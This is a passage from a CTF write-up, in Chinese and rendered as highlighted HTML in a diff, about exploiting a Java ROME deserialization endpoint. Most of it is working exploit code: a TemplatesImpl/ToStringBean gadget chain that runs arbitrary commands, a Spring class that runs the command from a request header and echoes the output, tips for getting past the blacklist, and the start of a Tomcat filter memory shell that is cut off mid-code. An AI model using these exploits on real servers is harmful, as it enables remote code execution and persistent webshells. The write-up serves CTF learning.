+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">return</span> <span style="color:#5af78e">&#34;calm down....&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>看一下controller，给了一个反序列化的入口，设置了黑名单</p>
+<p>我们查看一下pom.xml，熟悉的rome依赖</p>
+<p><img alt="image-20220817212224719" src="https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220817212224719.png"></p>
+<p>应该是打rome反序列化了，题目ban了俩类</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>java.util.HashMap
+</span></span><span style="display:flex;"><span>javax.management.BadAttributeValueExpException
+</span></span></code></pre></div><p>正常情况下rome调用链是</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span> * TemplatesImpl.getOutputProperties()
+</span></span><span style="display:flex;"><span> * NativeMethodAccessorImpl.invoke0(Method, Object, Object[])
+</span></span><span style="display:flex;"><span> * NativeMethodAccessorImpl.invoke(Object, Object[])
+</span></span><span style="display:flex;"><span> * DelegatingMethodAccessorImpl.invoke(Object, Object[])
+</span></span><span style="display:flex;"><span> * Method.invoke(Object, Object...)
+</span></span><span style="display:flex;"><span> * ToStringBean.toString(String)
+</span></span><span style="display:flex;"><span> * ToStringBean.toString()
+</span></span><span style="display:flex;"><span> * ObjectBean.toString()
+</span></span><span style="display:flex;"><span> * EqualsBean.beanHashCode()
+</span></span><span style="display:flex;"><span> * ObjectBean.hashCode()
+</span></span><span style="display:flex;"><span> * HashMap&lt;K,V&gt;.hash(Object)
+</span></span><span style="display:flex;"><span> * HashMap&lt;K,V&gt;.readObject(ObjectInputStream)
+</span></span></code></pre></div><p>HashMap的作用是触发hashCode调用toString方法，注意到题目中给了toString方法，也就是说我们的调用链可以简化成</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span> * TemplatesImpl.getOutputProperties()
+</span></span><span style="display:flex;"><span> * NativeMethodAccessorImpl.invoke0(Method, Object, Object[])
+</span></span><span style="display:flex;"><span> * NativeMethodAccessorImpl.invoke(Object, Object[])
+</span></span><span style="display:flex;"><span> * DelegatingMethodAccessorImpl.invoke(Object, Object[])
+</span></span><span style="display:flex;"><span> * Method.invoke(Object, Object...)
+</span></span><span style="display:flex;"><span> * ToStringBean.toString(String)
+</span></span><span style="display:flex;"><span> * ToStringBean.toString()
+</span></span></code></pre></div><p>根据rome链写个exp：</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> com.sun.syndication.feed.impl.ToStringBean;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> javax.xml.transform.Templates;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> java.io.*;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> java.lang.reflect.Field;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> java.util.Base64;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> javassist.ClassPool;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> javassist.CtClass;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> javassist.CtConstructor;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">public</span> <span style="color:#ff5c57">class</span> <span style="color:#f3f99d">rome2</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">public</span> <span style="color:#ff5c57">static</span> <span style="color:#9aedfe">byte</span><span style="color:#ff6ac1">[]</span> <span style="color:#57c7ff">serialize</span>(Object o) <span style="color:#ff5c57">throws</span> Exception{
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">try</span>(ByteArrayOutputStream baout <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">new</span> ByteArrayOutputStream();
+</span></span><span style="display:flex;"><span>            ObjectOutputStream oout <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">new</span> ObjectOutputStream(baout)){
+</span></span><span style="display:flex;"><span>            oout.<span style="color:#57c7ff">writeObject</span>(o);
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">return</span> baout.<span style="color:#57c7ff">toByteArray</span>();
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">public</span> <span style="color:#ff5c57">static</span> <span style="color:#9aedfe">void</span> <span style="color:#57c7ff">setFieldValue</span>(Object obj, String fieldName, Object value) <span style="color:#ff5c57">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        Field field <span style="color:#ff6ac1">=</span> obj.<span style="color:#57c7ff">getClass</span>().<span style="color:#57c7ff">getDeclaredField</span>(fieldName);
+</span></span><span style="display:flex;"><span>        field.<span style="color:#57c7ff">setAccessible</span>(<span style="color:#ff6ac1">true</span>);
+</span></span><span style="display:flex;"><span>        field.<span style="color:#57c7ff">set</span>(obj, value);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">public</span> <span style="color:#ff5c57">static</span> <span style="color:#9aedfe">byte</span><span style="color:#ff6ac1">[]</span> <span style="color:#57c7ff">getTemplatesImpl</span>(String cmd) {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">try</span> {
+</span></span><span style="display:flex;"><span>            ClassPool pool <span style="color:#ff6ac1">=</span> ClassPool.<span style="color:#57c7ff">getDefault</span>();
+</span></span><span style="display:flex;"><span>            CtClass ctClass <span style="color:#ff6ac1">=</span> pool.<span style="color:#57c7ff">makeClass</span>(<span style="color:#5af78e">&#34;snakin&#34;</span>);
+</span></span><span style="display:flex;"><span>            CtClass superClass <span style="color:#ff6ac1">=</span> pool.<span style="color:#57c7ff">get</span>(<span style="color:#5af78e">&#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&#34;</span>);
+</span></span><span style="display:flex;"><span>            ctClass.<span style="color:#57c7ff">setSuperclass</span>(superClass);
+</span></span><span style="display:flex;"><span>            CtConstructor constructor <span style="color:#ff6ac1">=</span> ctClass.<span style="color:#57c7ff">makeClassInitializer</span>();
+</span></span><span style="display:flex;"><span>            constructor.<span style="color:#57c7ff">setBody</span>(<span style="color:#5af78e">&#34;  Runtime.getRuntime().exec(\&#34;&#34;</span> <span style="color:#ff6ac1">+</span> cmd <span style="color:#ff6ac1">+</span> <span style="color:#5af78e">&#34;\&#34;);&#34;</span> );
+</span></span><span style="display:flex;"><span>            <span style="color:#9aedfe">byte</span><span style="color:#ff6ac1">[]</span> bytes <span style="color:#ff6ac1">=</span> ctClass.<span style="color:#57c7ff">toBytecode</span>();
+</span></span><span style="display:flex;"><span>            ctClass.<span style="color:#57c7ff">defrost</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">return</span> bytes;
+</span></span><span style="display:flex;"><span>        } <span style="color:#ff6ac1">catch</span> (Exception e) {
+</span></span><span style="display:flex;"><span>            e.<span style="color:#57c7ff">printStackTrace</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">return</span> <span style="color:#ff6ac1">new</span> <span style="color:#9aedfe">byte</span><span style="color:#ff6ac1">[]</span>{};
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">public</span> <span style="color:#ff5c57">static</span> <span style="color:#9aedfe">void</span> <span style="color:#57c7ff">main</span>(String<span style="color:#ff6ac1">[]</span> args) <span style="color:#ff5c57">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        <span style="color:#78787e">//恶意字节码</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#9aedfe">byte</span><span style="color:#ff6ac1">[]</span> code <span style="color:#ff6ac1">=</span> getTemplatesImpl(<span style="color:#5af78e">&#34;calc&#34;</span>);
+</span></span><span style="display:flex;"><span>        TemplatesImpl templates <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">new</span> TemplatesImpl();
+</span></span><span style="display:flex;"><span>        setFieldValue(templates,<span style="color:#5af78e">&#34;_name&#34;</span>,<span style="color:#5af78e">&#34;test&#34;</span>);
+</span></span><span style="display:flex;"><span>        setFieldValue(templates,<span style="color:#5af78e">&#34;_class&#34;</span>,<span style="color:#ff6ac1">null</span>);
+</span></span><span style="display:flex;"><span>        setFieldValue(templates,<span style="color:#5af78e">&#34;_bytecodes&#34;</span>,<span style="color:#ff6ac1">new</span> <span style="color:#9aedfe">byte</span><span style="color:#ff6ac1">[][]</span>{code});
+</span></span><span style="display:flex;"><span>        setFieldValue(templates,<span style="color:#5af78e">&#34;_tfactory&#34;</span>,<span style="color:#ff6ac1">new</span> TransformerFactoryImpl());
+</span></span><span style="display:flex;"><span>        ToStringBean toStringBean <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">new</span> ToStringBean(Templates.<span style="color:#57c7ff">class</span>,templates);
+</span></span><span style="display:flex;"><span>        toStringBean.<span style="color:#57c7ff">toString</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#9aedfe">byte</span><span style="color:#ff6ac1">[]</span> aaa <span style="color:#ff6ac1">=</span> serialize(toStringBean);
+</span></span><span style="display:flex;"><span>        System.<span style="color:#57c7ff">out</span>.<span style="color:#57c7ff">println</span>(Base64.<span style="color:#57c7ff">getEncoder</span>().<span style="color:#57c7ff">encodeToString</span>(aaa));
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>本地能够通过，但是远程是不出网的，网上有spring不出网通用回显，大致原理是通过spring上下文还有反射来回显利用：</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>https://github.com/SummerSec/JavaLearnVulnerability/blob/master/Rce_Echo/TomcatEcho/src/main/java/summersec/echo/Controller/SpringEcho.java
+</span></span></code></pre></div><p>需要注意的是加载恶意类我们需要将其继承AbstractTranslet</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> java.net.InetAddress;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> java.io.ByteArrayOutputStream;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> java.io.InputStream;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> java.io.ObjectOutputStream;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> java.io.*;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> java.lang.reflect.Method;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> java.util.Scanner;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">public</span> <span style="color:#ff5c57">class</span> <span style="color:#f3f99d">SpringEvil</span> <span style="color:#ff5c57">extends</span> AbstractTranslet
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#ff9f43">@Override</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">public</span> <span style="color:#9aedfe">void</span> <span style="color:#57c7ff">transform</span>(DOM document, SerializationHandler<span style="color:#ff6ac1">[]</span> handlers) <span style="color:#ff5c57">throws</span> TransletException {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff9f43">@Override</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">public</span> <span style="color:#9aedfe">void</span> <span style="color:#57c7ff">transform</span>(DOM document, DTMAxisIterator iterator, SerializationHandler handler) <span style="color:#ff5c57">throws</span> TransletException {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">public</span> <span style="color:#57c7ff">SpringEvil</span>() <span style="color:#ff5c57">throws</span> Exception{
+</span></span><span style="display:flex;"><span>        Class c <span style="color:#ff6ac1">=</span> Thread.<span style="color:#57c7ff">currentThread</span>().<span style="color:#57c7ff">getContextClassLoader</span>().<span style="color:#57c7ff">loadClass</span>(<span style="color:#5af78e">&#34;org.springframework.web.context.request.RequestContextHolder&#34;</span>);
+</span></span><span style="display:flex;"><span>        Method m <span style="color:#ff6ac1">=</span> c.<span style="color:#57c7ff">getMethod</span>(<span style="color:#5af78e">&#34;getRequestAttributes&#34;</span>);
+</span></span><span style="display:flex;"><span>        Object o <span style="color:#ff6ac1">=</span> m.<span style="color:#57c7ff">invoke</span>(<span style="color:#ff6ac1">null</span>);
+</span></span><span style="display:flex;"><span>        c <span style="color:#ff6ac1">=</span> Thread.<span style="color:#57c7ff">currentThread</span>().<span style="color:#57c7ff">getContextClassLoader</span>().<span style="color:#57c7ff">loadClass</span>(<span style="color:#5af78e">&#34;org.springframework.web.context.request.ServletRequestAttributes&#34;</span>);
+</span></span><span style="display:flex;"><span>        m <span style="color:#ff6ac1">=</span> c.<span style="color:#57c7ff">getMethod</span>(<span style="color:#5af78e">&#34;getResponse&#34;</span>);
+</span></span><span style="display:flex;"><span>        Method m1 <span style="color:#ff6ac1">=</span> c.<span style="color:#57c7ff">getMethod</span>(<span style="color:#5af78e">&#34;getRequest&#34;</span>);
+</span></span><span style="display:flex;"><span>        Object resp <span style="color:#ff6ac1">=</span> m.<span style="color:#57c7ff">invoke</span>(o);
+</span></span><span style="display:flex;"><span>        Object req <span style="color:#ff6ac1">=</span> m1.<span style="color:#57c7ff">invoke</span>(o); <span style="color:#78787e">// HttpServletRequest</span>
+</span></span><span style="display:flex;"><span>        Method getWriter <span style="color:#ff6ac1">=</span> Thread.<span style="color:#57c7ff">currentThread</span>().<span style="color:#57c7ff">getContextClassLoader</span>().<span style="color:#57c7ff">loadClass</span>(<span style="color:#5af78e">&#34;javax.servlet.ServletResponse&#34;</span>).<span style="color:#57c7ff">getDeclaredMethod</span>(<span style="color:#5af78e">&#34;getWriter&#34;</span>);
+</span></span><span style="display:flex;"><span>        Method getHeader <span style="color:#ff6ac1">=</span> Thread.<span style="color:#57c7ff">currentThread</span>().<span style="color:#57c7ff">getContextClassLoader</span>().<span style="color:#57c7ff">loadClass</span>(<span style="color:#5af78e">&#34;javax.servlet.http.HttpServletRequest&#34;</span>).<span style="color:#57c7ff">getDeclaredMethod</span>(<span style="color:#5af78e">&#34;getHeader&#34;</span>,String.<span style="color:#57c7ff">class</span>);
+</span></span><span style="display:flex;"><span>        getHeader.<span style="color:#57c7ff">setAccessible</span>(<span style="color:#ff6ac1">true</span>);
+</span></span><span style="display:flex;"><span>        getWriter.<span style="color:#57c7ff">setAccessible</span>(<span style="color:#ff6ac1">true</span>);
+</span></span><span style="display:flex;"><span>        Object writer <span style="color:#ff6ac1">=</span> getWriter.<span style="color:#57c7ff">invoke</span>(resp);
+</span></span><span style="display:flex;"><span>        String cmd <span style="color:#ff6ac1">=</span> (String)getHeader.<span style="color:#57c7ff">invoke</span>(req, <span style="color:#5af78e">&#34;cmd&#34;</span>);
+</span></span><span style="display:flex;"><span>        String<span style="color:#ff6ac1">[]</span> commands <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">new</span> String<span style="color:#ff6ac1">[</span>3<span style="color:#ff6ac1">]</span>;
+</span></span><span style="display:flex;"><span>        String charsetName <span style="color:#ff6ac1">=</span> System.<span style="color:#57c7ff">getProperty</span>(<span style="color:#5af78e">&#34;os.name&#34;</span>).<span style="color:#57c7ff">toLowerCase</span>().<span style="color:#57c7ff">contains</span>(<span style="color:#5af78e">&#34;window&#34;</span>) <span style="color:#ff6ac1">?</span> <span style="color:#5af78e">&#34;GBK&#34;</span>:<span style="color:#5af78e">&#34;UTF-8&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">if</span> (System.<span style="color:#57c7ff">getProperty</span>(<span style="color:#5af78e">&#34;os.name&#34;</span>).<span style="color:#57c7ff">toUpperCase</span>().<span style="color:#57c7ff">contains</span>(<span style="color:#5af78e">&#34;WIN&#34;</span>)) {
+</span></span><span style="display:flex;"><span>            commands<span style="color:#ff6ac1">[</span>0<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;cmd&#34;</span>;
+</span></span><span style="display:flex;"><span>            commands<span style="color:#ff6ac1">[</span>1<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;/c&#34;</span>;
+</span></span><span style="display:flex;"><span>        } <span style="color:#ff6ac1">else</span> {
+</span></span><span style="display:flex;"><span>            commands<span style="color:#ff6ac1">[</span>0<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;/bin/sh&#34;</span>;
+</span></span><span style="display:flex;"><span>            commands<span style="color:#ff6ac1">[</span>1<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;-c&#34;</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        commands<span style="color:#ff6ac1">[</span>2<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">=</span> cmd;
+</span></span><span style="display:flex;"><span>        writer.<span style="color:#57c7ff">getClass</span>().<span style="color:#57c7ff">getDeclaredMethod</span>(<span style="color:#5af78e">&#34;println&#34;</span>, String.<span style="color:#57c7ff">class</span>).<span style="color:#57c7ff">invoke</span>(writer, <span style="color:#ff6ac1">new</span> Scanner(Runtime.<span style="color:#57c7ff">getRuntime</span>().<span style="color:#57c7ff">exec</span>(commands).<span style="color:#57c7ff">getInputStream</span>(),charsetName).<span style="color:#57c7ff">useDelimiter</span>(<span style="color:#5af78e">&#34;\\A&#34;</span>).<span style="color:#57c7ff">next</span>());
+</span></span><span style="display:flex;"><span>        writer.<span style="color:#57c7ff">getClass</span>().<span style="color:#57c7ff">getDeclaredMethod</span>(<span style="color:#5af78e">&#34;flush&#34;</span>).<span style="color:#57c7ff">invoke</span>(writer);
+</span></span><span style="display:flex;"><span>        writer.<span style="color:#57c7ff">getClass</span>().<span style="color:#57c7ff">getDeclaredMethod</span>(<span style="color:#5af78e">&#34;close&#34;</span>).<span style="color:#57c7ff">invoke</span>(writer);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>那么将exp稍作修改：</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> com.sun.syndication.feed.impl.ToStringBean;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> javax.xml.transform.Templates;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> java.io.*;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> java.lang.reflect.Field;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> java.nio.file.Files;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> java.nio.file.Paths;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> java.util.Base64;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">public</span> <span style="color:#ff5c57">class</span> <span style="color:#f3f99d">rome2</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">public</span> <span style="color:#ff5c57">static</span> <span style="color:#9aedfe">byte</span><span style="color:#ff6ac1">[]</span> <span style="color:#57c7ff">serialize</span>(Object o) <span style="color:#ff5c57">throws</span> Exception{
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">try</span>(ByteArrayOutputStream baout <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">new</span> ByteArrayOutputStream();
+</span></span><span style="display:flex;"><span>            ObjectOutputStream oout <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">new</span> ObjectOutputStream(baout)){
+</span></span><span style="display:flex;"><span>            oout.<span style="color:#57c7ff">writeObject</span>(o);
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">return</span> baout.<span style="color:#57c7ff">toByteArray</span>();
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">public</span> <span style="color:#ff5c57">static</span> <span style="color:#9aedfe">void</span> <span style="color:#57c7ff">setFieldValue</span>(Object obj, String fieldName, Object value) <span style="color:#ff5c57">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        Field field <span style="color:#ff6ac1">=</span> obj.<span style="color:#57c7ff">getClass</span>().<span style="color:#57c7ff">getDeclaredField</span>(fieldName);
+</span></span><span style="display:flex;"><span>        field.<span style="color:#57c7ff">setAccessible</span>(<span style="color:#ff6ac1">true</span>);
+</span></span><span style="display:flex;"><span>        field.<span style="color:#57c7ff">set</span>(obj, value);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">public</span> <span style="color:#ff5c57">static</span> <span style="color:#9aedfe">void</span> <span style="color:#57c7ff">main</span>(String<span style="color:#ff6ac1">[]</span> args) <span style="color:#ff5c57">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        <span style="color:#9aedfe">byte</span><span style="color:#ff6ac1">[]</span> code <span style="color:#ff6ac1">=</span> Files.<span style="color:#57c7ff">readAllBytes</span>(Paths.<span style="color:#57c7ff">get</span>(<span style="color:#5af78e">&#34;D:\\javacc\\SpringEvil.class&#34;</span>));
+</span></span><span style="display:flex;"><span>        TemplatesImpl templates <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">new</span> TemplatesImpl();
+</span></span><span style="display:flex;"><span>        setFieldValue(templates,<span style="color:#5af78e">&#34;_name&#34;</span>,<span style="color:#5af78e">&#34;test&#34;</span>);
+</span></span><span style="display:flex;"><span>        setFieldValue(templates,<span style="color:#5af78e">&#34;_class&#34;</span>,<span style="color:#ff6ac1">null</span>);
+</span></span><span style="display:flex;"><span>        setFieldValue(templates,<span style="color:#5af78e">&#34;_bytecodes&#34;</span>,<span style="color:#ff6ac1">new</span> <span style="color:#9aedfe">byte</span><span style="color:#ff6ac1">[][]</span>{code});
+</span></span><span style="display:flex;"><span>        setFieldValue(templates,<span style="color:#5af78e">&#34;_tfactory&#34;</span>,<span style="color:#ff6ac1">new</span> TransformerFactoryImpl());
+</span></span><span style="display:flex;"><span>        ToStringBean toStringBean <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">new</span> ToStringBean(Templates.<span style="color:#57c7ff">class</span>,templates);
+</span></span><span style="display:flex;"><span>        <span style="color:#9aedfe">byte</span><span style="color:#ff6ac1">[]</span> aaa <span style="color:#ff6ac1">=</span> serialize(toStringBean);
+</span></span><span style="display:flex;"><span>        System.<span style="color:#57c7ff">out</span>.<span style="color:#57c7ff">println</span>(Base64.<span style="color:#57c7ff">getEncoder</span>().<span style="color:#57c7ff">encodeToString</span>(aaa));
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>之后传入参数命令执行即可</p>
+<p><img alt="image-20220829145449424" src="https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220829145449424.png"></p>
+<h3 id="补充">补充</h3>
+<h4 id="rome链绕过黑名单">rome链绕过黑名单</h4>
+<p>由于题目中给了toString方法，我们可以直接简化利用链而不使用hashmap。同时我们也可以利用Hashtable来替代HashMap。</p>
+<h4 id="不出网回显之内存马">不出网回显之内存马</h4>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff5c57">public</span> <span style="color:#ff5c57">static</span> <span style="color:#ff5c57">class</span> <span style="color:#f3f99d">E</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">static</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">try</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#78787e">//这里采取Litch1师傅文章的思路，通过WebappClassLoader拿到StandardContext</span>
+</span></span><span style="display:flex;"><span>            Class WebappClassLoaderBaseClz <span style="color:#ff6ac1">=</span> Class.<span style="color:#57c7ff">forName</span>(<span style="color:#5af78e">&#34;org.apache.catalina.loader.WebappClassLoaderBase&#34;</span>);
+</span></span><span style="display:flex;"><span>            Object webappClassLoaderBase <span style="color:#ff6ac1">=</span> Thread.<span style="color:#57c7ff">currentThread</span>().<span style="color:#57c7ff">getContextClassLoader</span>();
+</span></span><span style="display:flex;"><span>            Field WebappClassLoaderBaseResource <span style="color:#ff6ac1">=</span> WebappClassLoaderBaseClz.<span style="color:#57c7ff">getDeclaredField</span>(<span style="color:#5af78e">&#34;resources&#34;</span>);
+</span></span><span style="display:flex;"><span>            WebappClassLoaderBaseResource.<span style="color:#57c7ff">setAccessible</span>(<span style="color:#ff6ac1">true</span>);
+</span></span><span style="display:flex;"><span>            Object resources <span style="color:#ff6ac1">=</span> WebappClassLoaderBaseResource.<span style="color:#57c7ff">get</span>(webappClassLoaderBase);
+</span></span><span style="display:flex;"><span>            Class WebResourceRoot <span style="color:#ff6ac1">=</span> Class.<span style="color:#57c7ff">forName</span>(<span style="color:#5af78e">&#34;org.apache.catalina.WebResourceRoot&#34;</span>);
+</span></span><span style="display:flex;"><span>            Method getContext <span style="color:#ff6ac1">=</span> WebResourceRoot.<span style="color:#57c7ff">getDeclaredMethod</span>(<span style="color:#5af78e">&#34;getContext&#34;</span>, <span style="color:#ff6ac1">null</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#78787e">//拿到StandardContext后就可以通过addFilterMap方法注入filter型内存马了</span>
+</span></span><span style="display:flex;"><span>            StandardContext standardContext <span style="color:#ff6ac1">=</span> (StandardContext) getContext.<span style="color:#57c7ff">invoke</span>(resources, <span style="color:#ff6ac1">null</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Filter filter <span style="color:#ff6ac1">=</span> (servletRequest, servletResponse, filterChain) <span style="color:#ff6ac1">-&gt;</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        FileInputStream fis <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">new</span> FileInputStream(<span style="color:#5af78e">&#34;/flag&#34;</span>);
+</span></span><span style="display:flex;"><span>                        <span style="color:#9aedfe">byte</span><span style="color:#ff6ac1">[]</span> buffer <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">new</span> <span style="color:#9aedfe">byte</span><span style="color:#ff6ac1">[</span>16<span style="color:#ff6ac1">]</span>;
+</span></span><span style="display:flex;"><span>                        StringBuilder res <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">new</span> StringBuilder();
+</span></span><span style="display:flex;"><span>                        <span style="color:#ff6ac1">while</span> (fis.<span style="color:#57c7ff">read</span>(buffer) <span style="color:#ff6ac1">!=</span> <span style="color:#ff6ac1">-</span>1) {
+</span></span><span style="display:flex;"><span>                            res.<span style="color:#57c7ff">append</span>(<span style="color:#ff6ac1">new</span> String(buffer));
+</span></span><span style="display:flex;"><span>                            buffer <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">new</span> <span style="color:#9aedfe">byte</span><span style="color:#ff6ac1">[</span>16<span style="color:#ff6ac1">]</span>;
+</span></span><span style="display:flex;"><span>                        }
+</span></span><span style="display:flex;"><span>                        fis.<span style="color:#57c7ff">close</span>();
